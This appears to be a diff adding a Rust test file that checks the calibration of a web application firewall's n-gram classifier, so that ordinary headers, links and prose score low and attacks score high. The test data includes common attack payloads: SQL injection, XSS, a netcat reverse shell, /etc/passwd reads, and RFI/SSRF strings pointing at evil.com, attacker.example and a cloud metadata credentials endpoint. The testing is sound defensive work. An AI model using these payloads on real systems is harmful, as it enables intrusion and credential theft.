@@ -1,0 +1,164 @@
+//! Calibration guard for the n-gram classifier's two operating points.
+//!
+//! The classifier is consulted for two different jobs and a regression in either
+//! is silent, so both are pinned here:
+//!
+//!   * `>= 0.9`  — additive detection. A confident hit contributes a blocking
+//!     amount of anomaly score on its own.
+//!   * `<  0.5`  — the FP-suppression VETO (`ML_SUPPRESSION_MAX` in
+//!     sentinel-proxy). Below this the classifier vouches for the value and a
+//!     weak-evidence rule block is suppressed.
+//!
+//! Two invariants matter and neither is obvious from the model file:
+//!
+//! 1. Ordinary traffic must stay below the veto cutoff. `payload_attack` is a MAX
+//!    over every candidate in the request, so a single routine value scoring high
+//!    pins every request above the cutoff and silently disables FP suppression
+//!    everywhere. A previous model scored a plain `Accept: text/html,...` at 0.897
+//!    and an Instagram share link at 0.995, which is exactly that failure.
+//!
+//! 2. URL-shaped input must be judged by WHERE IT POINTS, not by being a URL.
+//!    Teaching the model that ordinary links are benign must not let RFI/SSRF
+//!    payloads through on the same shape.
+
+use sentinel_ml::models::ngram_classifier as ng;
+
+/// Mirrors `ML_SUPPRESSION_MAX` in sentinel-proxy. Keep the two in step.
+const SUPPRESSION_MAX: f32 = 0.5;
+/// Mirrors the default `ml.sensitivity` at which a hit contributes score.
+const DETECTION_MIN: f32 = 0.9;
+
+fn score(s: &str) -> f32 {
+    ng::score_all(s).unwrap_or_else(|| panic!("classifier not loaded while scoring {s:?}"))
+}
+
+fn assert_all_below(label: &str, cutoff: f32, items: &[&str]) {
+    let bad: Vec<_> = items
+        .iter()
+        .map(|s| (*s, score(s)))
+        .filter(|(_, v)| *v >= cutoff)
+        .collect();
+    assert!(
+        bad.is_empty(),
+        "{label}: expected every value < {cutoff}, but these scored at or above it \
+         (a value here disables FP suppression for the whole request): {bad:#?}"
+    );
+}
+
+fn assert_all_atleast(label: &str, floor: f32, items: &[&str]) {
+    let bad: Vec<_> = items
+        .iter()
+        .map(|s| (*s, score(s)))
+        .filter(|(_, v)| *v < floor)
+        .collect();
+    assert!(
+        bad.is_empty(),
+        "{label}: expected every value >= {floor}, but these scored below it \
+         (they would no longer contribute blocking score): {bad:#?}"
+    );
+}
+
+#[test]
+fn model_is_loaded() {
+    assert!(
+        ng::is_loaded(),
+        "embedded n-gram model failed to load — FP suppression silently degrades \
+         to 'never suppress' and header/cookie scoring goes blind"
+    );
+}
+
+#[test]
+fn ordinary_header_values_stay_below_the_veto_cutoff() {
+    assert_all_below(
+        "ordinary header values",
+        SUPPRESSION_MAX,
+        &[
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "application/json, text/plain, */*",
+            "gzip, deflate, br",
+            "en-US,en;q=0.9,hi;q=0.8",
+            "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
+            "application/x-www-form-urlencoded",
+            "no-store, must-revalidate",
+            "sessionid=a1b2c3d4e5f6; csrftoken=xyz789; _ga=GA1.2.1234567890.1234567890",
+            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123",
+            "XMLHttpRequest",
+            "example.com:8443",
+        ],
+    );
+}
+
+#[test]
+fn ordinary_urls_stay_below_the_veto_cutoff() {
+    assert_all_below(
+        "ordinary URLs and share links",
+        SUPPRESSION_MAX,
+        &[
+            "https://www.instagram.com/p/B_uHgI7lY0Z/?igshid=1m7xkk7a9v6z4&utm_source=ig_web_copy_link",
+            "https://www.google.com/search?q=test+query&oq=test",
+            "https://github.com/orgs/acme/repos?page=2&sort=updated",
+            "url=https://www.example.com/checkout/cart?ref=email",
+            "https://youtu.be/dQw4w9WgXcQ?si=abc123XYZ",
+            "next=/account/settings",
+        ],
+    );
+}
+
+#[test]
+fn adversarial_benign_prose_stays_below_the_veto_cutoff() {
+    // Natural language that happens to carry SQL/shell tokens. These are the
+    // shapes that made the WAF block ordinary traffic.
+    assert_all_below(
+        "adversarial-benign prose",
+        SUPPRESSION_MAX,
+        &[
+            "union was a great select",
+            "D'or 1st parfume",
+            "john or@var.es",
+            "zsh is the best!",
+            "ls 300 lexus",
+            "nc 8000 controller",
+            "I would like to select a union representative",
+            "please cat the file for me",
+        ],
+    );
+}
+
+#[test]
+fn unambiguous_attacks_still_reach_the_detection_threshold() {
+    assert_all_atleast(
+        "unambiguous attacks",
+        DETECTION_MIN,
+        &[
+            "1' OR '1'='1",
+            "' UNION SELECT username,password FROM users--",
+            "<script>alert(1)</script>",
+            "<svg onload=alert(1)>",
+            "; cat /etc/passwd",
+            "| nc -e /bin/sh 10.0.0.1 4444",
+            "../../../../etc/passwd",
+            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
+            "<img src=x onerror=alert(document.cookie)>",
+        ],
+    );
+}
+
+#[test]
+fn url_shaped_attacks_are_judged_by_target_not_by_shape() {
+    // The counterweight to `ordinary_urls_...`: benign-URL training must not make
+    // "it is a URL" a free pass for RFI/SSRF.
+    assert_all_atleast(
+        "URL-shaped attacks",
+        SUPPRESSION_MAX,
+        &[
+            "url=http://evil.com/shell.php",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "file:///etc/passwd",
+            "include=http://attacker.example/c99.txt",
+            "gopher://127.0.0.1:11211/_",
+        ],
+    );
+}
